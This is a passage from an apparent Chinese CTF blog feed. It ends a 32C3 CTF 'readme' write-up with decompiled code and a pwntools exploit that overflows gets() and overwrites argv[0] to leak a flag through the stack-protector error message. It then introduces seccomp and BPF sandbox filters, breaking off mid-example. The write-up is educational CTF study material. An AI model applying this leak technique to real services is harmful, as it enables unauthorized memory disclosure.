(__fortify_fail)</span><br></pre></td></tr></table></figure><blockquote><p>总结一下原因就是现在不会打印 argv[0] 指针所指向的字符串</p></blockquote><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>32C3 CTF readme</strong></p><p>ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4007E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Hello!\nWhat&#x27;s your name? &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets(v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;</span>, v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    byte_600D20[v0++] = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">void</span> *)((<span class="type">int</span>)v0 + <span class="number">0x600D20</span>LL), <span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">32</span> - v0));</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you, bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然<code>_IO_gets(v3)</code>存在溢出</p><p>观察可以得到0x600D20处就是存放flag的地址,但是可以看出无论我们读不读这个地址都会被覆盖</p><p>不过这里有一个知识点:</p><p><strong>在 ELF 内存映射时，bss 段会被映射两次</strong>，所以可以使用另一处的地址来进行输出，可以使用 gdb 的search来进行查找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search <span class="string">&#x27;Server&#x27;</span></span><br><span class="line">Searching <span class="keyword">for</span> value: <span class="string">&#x27;Server&#x27;</span></span><br><span class="line">bin             <span class="number">0x400d28</span> push rbx <span class="comment">/* &#x27;ServerHasTheFlagHere...&#x27; */</span></span><br><span class="line">bin             <span class="number">0x600d28</span> <span class="string">&#x27;ServerHasTheFlagHere...&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">smash = ELF(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">argv_addr = <span class="number">0x00007fffffffdc58</span></span><br><span class="line">name_addr = <span class="number">0x7fffffffda40</span></span><br><span class="line">flag_addr = <span class="number">0x600D20</span></span><br><span class="line">another_flag_addr = <span class="number">0x400d20</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (argv_addr - name_addr) + p64(another_flag_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;flag: &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">data = sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seccomp初识</title>
      <link href="/posts/57317/"/>
      <url>/posts/57317/</url>
      
        <content type="html"><![CDATA[<h1 id="c沙盒—seccomp"><a href="#c沙盒—seccomp" class="headerlink" title="c沙盒—seccomp"></a>c沙盒—seccomp</h1><p>linux中一般使用seccomp有两种方法，一种是<strong>prctl</strong>，另一种是用<strong>seccomp</strong></p><p>ctf中使用沙箱一般都会禁用execve函数，使之无法直接getshell</p><p><strong>seccomp函数本身会申请chunk，所以堆块结构初始会有一些不同,也就是一些师傅说的影响堆的风水</strong></p><p>主要是seccomp_rule_add和seccomp_load这两个函数影响了tcache和fastbin的风水。</p><p><strong>prctl则不会</strong></p><h2 id="原理BPF"><a href="#原理BPF" class="headerlink" title="原理BPF"></a>原理BPF</h2><p>BPF即伯克利包过滤器(Berkeley Packets Filter)</p><p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p><p>以下更多介绍其在CTF沙盒中的使用</p><p>以禁用execve函数的规则为例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sock_filter</span> filter[] = &#123;</span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>), <span class="comment">//前面两步用于检查arch</span></span><br><span class="line"><span class="built_in">BPF_JUMP</span>(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),</span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),    <span class="comment">//将帧的偏移0处，取4个字节数据，也就是系统调用号的值载入累加器</span></span><br><span class="line"><span class="built_in">BPF_JUMP</span>(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),    <span class="comment">//当A == 59时，顺序执行下一条规则，否则跳过下一条规则，这里的59就是x64的execve系统调用</span></span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_RET+BPF_K,SECCOMP_RET_KILL),     <span class="comment">//返回KILL</span></span><br><span class="line"><span class="built_in">BPF_STMT</span>(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),    <span class="comment">//返回ALLOW</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在linux/filter.h中找到结构体和宏指令，BPF的过滤规则就是由两个指令宏组成的指令序列完成的，这个序列是一个结构体数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *    Try and keep these values and structures similar to BSD, especially</span></span><br><span class="line"><span class="comment"> *    the BPF code definitions which need to match so you can share filters</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sock_filter</span> &#123;    <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16    code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">    __u8    jt;    <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;    <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32    k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sock_fprog</span> &#123;    <span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>        len;    <span class="comment">/* Number of filter blocks */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> __user *filter;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ret - BPF_K and BPF_X also apply */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RVAL(code)  ((code) &amp; 0x18)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>         BPF_A           0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* misc */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISCOP(code) ((code) &amp; 0xf8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>         BPF_TAX         0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>         BPF_TXA         0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macros for filter block array initializers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_STMT<span class="comment">//一般执行加载指令</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_JUMP<span class="comment">//一般执行判断跳转和返回指令</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在linux/seccomp.h中存在用于BPF_STMT的结构体,BPF_STMT的第二个参数一般就是根据这个定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> nr;<span class="comment">//系统调用号</span></span><br><span class="line">__u32 arch;</span><br><span class="line">__u64 instruction_pointer;</span><br><span class="line">__u64 args[<span class="number">6</span>];<span class="comment">//参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在linux/bpf_common.h中有BPF_STMT和BPF_JUMP这两个操作指令参数的介绍</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)            <span class="comment">//首先指定操作的类别</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LD        0x00                                        <span class="comment">//将操作数装入A或者X</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LDX        0x01                   </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ST        0x02                                        <span class="comment">//拷贝A或X的值到内存</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_STX        0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ALU        0x04                                        <span class="comment">//用X或常数作为操作数在累加器上执行算数或逻辑运算</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JMP        0x05                                        <span class="comment">//跳转指令</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RET        0x06                                        <span class="comment">//终止过滤器并表明报文的哪一部分保留下来，如果返回0，报文全部被丢弃</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MISC     0x07</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ld/ldx fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="comment">//在ld时指定操作数的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_W        0x00                <span class="comment">//双字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_H        0x08                <span class="comment">//单字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_B        0x10                <span class="comment">//单字节</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="comment">//操作数类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IMM        0x00  <span class="comment">//立即数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ABS        0x20                        <span class="comment">//绝对偏移                   </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IND        0x40                        <span class="comment">//相对偏移</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MEM        0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LEN        0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MSH        0xa0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* alu/jmp fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="comment">//当操作码类型为ALU时，指定具体运算符</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ADD        0x00                    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_SUB        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MUL        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_DIV        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_OR        0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_AND        0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LSH        0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RSH        0x70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_NEG        0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MOD        0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_XOR        0xa0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JA        0x00                    <span class="comment">//当操作码类型是JMP时指定跳转类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JEQ        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGT        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGE        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JSET        0x40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)        </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_K        0x00                    <span class="comment">//常数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_X        0x08</span></span><br></pre></td></tr></table></figure><p>一条指令包含多个部分,只需要按照结构体去创建规则就可以使用它，可以有多条过滤规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。</p><p><strong>以较为常见的指令为例:</strong></p><p><strong><code>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,x)</code>从BPF_STMT结构体的绝对偏移x处开始加载四个字节到寄存器</strong></p><p><strong><code>BPF_JUMP(BPF_JMP+BPF_JEQ,x,a,b)</code>如果此时寄存器中的值与x相等,则跳过之后的a行代码,如果不等,则跳过之后的b行代码</strong></p><p>此外还有对寄存器中数操作的AUL操作</p><p>当然BPF还能实现更多更高级的功能,可以深入研究</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>有两个系统调用与 seccomp 有关，一个是<code>prctl</code>，另一个是<code>seccomp</code>，系统调用号分别为 157 和 317，对应的内核函数为<code>sys_prctl</code>和<code>sys_seccomp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(seccomp, <span class="type">unsigned</span> <span class="type">int</span>, op, <span class="type">unsigned</span> <span class="type">int</span>, flags,</span><br><span class="line"> <span class="type">void</span> __user *, uargs)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> do_seccomp(op, flags, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS39</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> PR_GET_SECCOMP:</span><br><span class="line">            error = prctl_get_seccomp();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PR_SET_SECCOMP:</span><br><span class="line">            error = prctl_set_seccomp(arg2, (<span class="type">char</span> __user *)arg3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_DISABLED0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">prctl_set_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode, <span class="type">void</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line"><span class="type">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Setting strict mode through prctl always ignored filter,</span></span><br><span class="line"><span class="comment"> * so make sure it is always NULL here to pass the internal</span></span><br><span class="line"><span class="comment"> * check in do_seccomp().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">uargs = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">uargs = filter;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* prctl interface doesn&#x27;t have flags, so they are always zero. */</span></span><br><span class="line"><span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果将<code>prctl</code>系统调用的第一个参数设置为<code>PR_SET_SECCOMP</code>，最终调用的与<code>sys_seccomp</code>相同，都是<code>do_seccomp</code>。这也是设置<code>seccomp</code>规则的入口函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Common entry point for both prctl and syscall. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> op, <span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">       <span class="type">void</span> __user *uargs)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (op) &#123;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_SET_MODE_STRICT:</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span> || uargs != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">return</span> seccomp_set_mode_strict();</span><br><span class="line"><span class="keyword">case</span> SECCOMP_SET_MODE_FILTER:</span><br><span class="line"><span class="keyword">return</span> seccomp_set_mode_filter(flags, uargs);</span><br><span class="line"><span class="keyword">case</span> SECCOMP_GET_ACTION_AVAIL:</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> seccomp_get_action_avail(uargs);</span><br><span class="line"><span class="keyword">case</span> SECCOMP_GET_NOTIF_SIZES:</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> seccomp_get_notif_sizes(uargs);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时不做分析</p><h2 id="prctl函数实现"><a href="#prctl函数实现" class="headerlink" title="prctl函数实现"></a>prctl函数实现</h2><p>这个函数可以对进程进行许多操作，其中第一个参数用于指定操作,因此第一个参数的可选项非常多。</p><p>用在沙盒中,第一个参数常见的为<code>38(PR_SET_NO_NEW_PRIVS)</code>和<code>22(PR_SET_SECCOMP)</code>两种情况</p><h3 id="38-PR-SET-NO-NEW-PRIVS"><a href="#38-PR-SET-NO-NEW-PRIVS" class="headerlink" title="38(PR_SET_NO_NEW_PRIVS)"></a>38(PR_SET_NO_NEW_PRIVS)</h3><p><code>prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</code></p><p>为了保证安全性，需要将PR_SET_NO_NEW_PRIVSW位设置位1。这个操作能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，而且设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。</p><h3 id="22-PR-SET-SECCOMP"><a href="#22-PR-SET-SECCOMP" class="headerlink" title="22(PR_SET_SECCOMP)"></a>22(PR_SET_SECCOMP)</h3><ul><li><p>第二个参数为 SECCOMP_MODE_STRICT(1)时,无需使用第三个参数,此时只允许调用read/write/_exit(not exit_group)/sigreturn等少数系统调用</p></li><li><p>第二个参数为SECCOMP_MODE_FILTER(2)时,其中对syscall的限制通过参数3的结构体来自定义过滤规则</p><p>prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</p><p>&amp;prog就是我们定义的过滤规则</p></li></ul><p>一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 